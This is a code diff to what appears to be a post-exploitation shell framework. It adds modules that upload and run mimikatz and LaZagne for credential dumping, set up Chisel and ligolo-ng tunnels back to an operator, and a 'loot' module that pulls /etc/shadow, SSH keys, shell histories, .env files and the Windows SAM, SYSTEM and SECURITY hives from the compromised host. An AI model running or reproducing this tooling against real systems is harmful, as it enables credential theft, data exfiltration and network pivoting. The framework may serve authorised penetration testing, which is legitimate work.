@@ -4336,6 +4336,7 @@ class upload_privesc_scripts(Module):
 
 		elif session.OS == 'Windows':
 			session.upload(URLS['winpeas'])
+			session.upload(URLS['winpeasx64'])
 			session.upload(URLS['powerup'])
 			session.upload(URLS['privesccheck'])
 
@@ -4413,6 +4414,18 @@ class lse(Module):
 			logger.error("This module runs only on Unix shells")
 
 
+class linenum(Module):
+	category = "Privilege Escalation"
+	def run(session, args):
+		"""
+		Run LinEnum for comprehensive Linux enumeration in the background
+		"""
+		if session.OS == 'Unix':
+			session.script(URLS['linenum'])
+		else:
+			logger.error("This module runs only on Unix shells")
+
+
 class linuxexploitsuggester(Module):
 	category = "Privilege Escalation"
 	def run(session, args):
@@ -4429,16 +4442,26 @@ class pspy(Module):
 	category = "Privilege Escalation"
 	def run(session, args):
 		"""
-		Monitor Linux processes without root permissions using pspy64
+		Monitor Linux processes without root permissions using pspy (auto-detects 32/64-bit)
 		"""
 		if session.OS == 'Unix':
 			if not session.system == 'Linux':
 				logger.error(f"This module runs only on Linux, not on {session.system}.")
 				return False
-			uploaded_path = session.upload(URLS['pspy64'], remote_path=session.tmp)
+
+			# Auto-detect architecture
+			arch = session.arch.lower() if session.arch else ''
+			if 'x86_64' in arch or 'amd64' in arch:
+				pspy_url = URLS['pspy64']
+				pspy_name = 'pspy64'
+			else:
+				pspy_url = URLS['pspy32']
+				pspy_name = 'pspy32'
+
+			uploaded_path = session.upload(pspy_url, remote_path=session.tmp)
 			if uploaded_path:
 				session.exec(f"chmod +x {uploaded_path[0]}")
-				logger.info(f"pspy64 uploaded to {uploaded_path[0]}")
+				logger.info(f"{pspy_name} uploaded to {uploaded_path[0]}")
 				tf = f"/tmp/{rand(8)}"
 				with open(tf, "w") as f:
 					f.write("#!/bin/sh\n")
@@ -4478,6 +4501,106 @@ class meterpreter(Module):
 				logger.error(f"Cannot create meterpreter payload: {result.stderr}")
 
 
+class chisel(Module):
+	category = "Pivoting"
+	def run(session, args):
+		"""
+		Setup Chisel for fast TCP/UDP tunneling
+		Usage: run chisel [server_port]
+		"""
+		if session.OS == 'Unix':
+			url = URLS['chisel_linux']
+		elif session.OS == 'Windows':
+			url = URLS['chisel_windows']
+		else:
+			logger.error("Unsupported OS")
+			return False
+
+		uploaded_paths = session.upload(url, remote_path=session.tmp)
+		if not uploaded_paths:
+			return False
+
+		# Extract .gz file
+		if session.OS == 'Unix':
+			session.exec(f"gunzip -f {uploaded_paths[0]}")
+			chisel_path = uploaded_paths[0].replace('.gz', '')
+			session.exec(f"chmod +x {chisel_path}")
+			logger.info(f"Chisel uploaded to {chisel_path}")
+			logger.info("Start client with: ./chisel client <SERVER_IP>:<PORT> R:<LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT>")
+		elif session.OS == 'Windows':
+			# Windows needs gunzip alternative or pre-extracted
+			logger.warning("Windows chisel requires manual extraction of .gz file")
+			logger.info(f"Chisel uploaded to {uploaded_paths[0]}")
+
+
+class lazagne(Module):
+	category = "Privilege Escalation"
+	def run(session, args):
+		"""
+		Extract credentials using LaZagne password recovery tool
+		"""
+		if session.OS == 'Unix':
+			url = URLS['lazagne_linux']
+			uploaded_paths = session.upload(url, remote_path=session.tmp)
+			if uploaded_paths:
+				logger.info(f"LaZagne uploaded to {uploaded_paths[0]}")
+				logger.info("Run with: python lazagne.py all")
+		elif session.OS == 'Windows':
+			url = URLS['lazagne_windows']
+			uploaded_paths = session.upload(url, remote_path=session.tmp)
+			if uploaded_paths:
+				logger.info(f"LaZagne uploaded to {uploaded_paths[0]}")
+				output = session.exec(f"{uploaded_paths[0]} all", value=True, timeout=30)
+				if output:
+					print(output)
+		else:
+			logger.error("Unsupported OS")
+
+
+class mimikatz(Module):
+	category = "Privilege Escalation"
+	def run(session, args):
+		"""
+		Upload mimikatz for credential extraction on Windows
+		"""
+		if session.OS == 'Windows':
+			uploaded_paths = session.upload(URLS['mimikatz'], remote_path=session.tmp)
+			if uploaded_paths:
+				logger.info(f"Mimikatz uploaded to {uploaded_paths[0]}")
+				logger.info("Extract the zip and run: mimikatz.exe")
+				logger.info("Common commands:")
+				logger.info("  privilege::debug")
+				logger.info("  sekurlsa::logonpasswords")
+				logger.info("  lsadump::sam")
+		else:
+			logger.error("This module runs only on Windows shells")
+
+
+class ligolo(Module):
+	category = "Pivoting"
+	def run(session, args):
+		"""
+		Setup ligolo-ng agent for advanced tunneling and pivoting
+		"""
+		if session.OS == 'Unix':
+			url = URLS['ligolo_linux']
+			uploaded_paths = session.upload(url, remote_path=session.tmp)
+			if uploaded_paths:
+				session.exec(f"tar -xzf {uploaded_paths[0]} -C {session.tmp}")
+				agent_path = f"{session.tmp}/agent"
+				session.exec(f"chmod +x {agent_path}")
+				logger.info(f"Ligolo-ng agent extracted to {agent_path}")
+				logger.info("Start with: ./agent -connect <PROXY_IP>:11601 -ignore-cert")
+		elif session.OS == 'Windows':
+			url = URLS['ligolo_windows']
+			uploaded_paths = session.upload(url, remote_path=session.tmp)
+			if uploaded_paths:
+				logger.info(f"Ligolo-ng uploaded to {uploaded_paths[0]}")
+				logger.info("Extract and run: agent.exe -connect <PROXY_IP>:11601 -ignore-cert")
+		else:
+			logger.error("Unsupported OS")
+
+
 class ngrok(Module):
 	category = "Pivoting"
 	def run(session, args):
@@ -4512,6 +4635,53 @@ class ngrok(Module):
 			session.script(tf)
 		else:
 			logger.error("This module runs only on Unix shells")
+
+
+class loot(Module):
+	category = "Misc"
+	def run(session, args):
+		"""
+		Automatically collect sensitive files from the target system
+		"""
+		if session.OS == 'Unix':
+			targets = [
+				'/etc/passwd',
+				'/etc/shadow',
+				'/etc/group',
+				'/etc/sudoers',
+				'/etc/hosts',
+				'/root/.ssh/',
+				'/home/*/.ssh/',
+				'/root/.bash_history',
+				'/home/*/.bash_history',
+				'/var/www/html/config*',
+				'/var/www/html/.env',
+				'/var/www/*/config*',
+				'/opt/*/config*',
+				'/etc/mysql/my.cnf',
+				'/etc/apache2/.htpasswd',
+				'/root/.mysql_history'
+			]
+			logger.info("Collecting sensitive files...")
+			files_str = ' '.join(targets)
+			session.download(files_str)
+
+		elif session.OS == 'Windows':
+			targets = [
+				'C:\\Windows\\System32\\config\\SAM',
+				'C:\\Windows\\System32\\config\\SYSTEM',
+				'C:\\Windows\\System32\\config\\SECURITY',
+				'%USERPROFILE%\\Desktop\\*.txt',
+				'%USERPROFILE%\\Documents\\*.doc*',
+				'%USERPROFILE%\\Documents\\*.xls*',
+				'C:\\inetpub\\wwwroot\\web.config',
+				'%APPDATA%\\FileZilla\\*.xml'
+			]
+			logger.info("Collecting sensitive files...")
+			for target in targets:
+				session.download(target)
+		else:
+			logger.error("Unsupported OS")
 
 
 class uac(Module):
@@ -5207,6 +5377,7 @@ LINUX_PATH = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap
 URLS = {
 	'linpeas':      "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh",
 	'winpeas':      "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat",
+	'winpeasx64':   "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe",
 	'socat':        "https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat",
 	'ncat':         "https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/ncat",
 	'lse':          "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh",
@@ -5214,7 +5385,16 @@ URLS = {
 	'deepce':       "https://raw.githubusercontent.com/stealthcopter/deepce/refs/heads/main/deepce.sh",
 	'privesccheck': "https://raw.githubusercontent.com/itm4n/PrivescCheck/refs/heads/master/PrivescCheck.ps1",
 	'les':          "https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/refs/heads/master/linux-exploit-suggester.sh",
+	'linenum':      "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh",
 	'pspy64':       "https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64",
+	'pspy32':       "https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32",
+	'chisel_linux': "https://github.com/jpillora/chisel/releases/latest/download/chisel_1.10.1_linux_amd64.gz",
+	'chisel_windows': "https://github.com/jpillora/chisel/releases/latest/download/chisel_1.10.1_windows_amd64.gz",
+	'lazagne_linux': "https://github.com/AlessandroZ/LaZagne/releases/latest/download/lazagne.py",
+	'lazagne_windows': "https://github.com/AlessandroZ/LaZagne/releases/latest/download/lazagne.exe",
+	'mimikatz':     "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip",
+	'ligolo_linux': "https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_0.6.2_linux_amd64.tar.gz",
+	'ligolo_windows': "https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_0.6.2_windows_amd64.zip",
 	'ngrok_linux':  "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz",
 	'uac_linux':  	"https://github.com/tclahr/uac/releases/download/v3.1.0/uac-3.1.0.tar.gz",
 	'linux_procmemdump':  	"https://raw.githubusercontent.com/tclahr/uac/refs/heads/main/bin/linux/linux_procmemdump.sh",
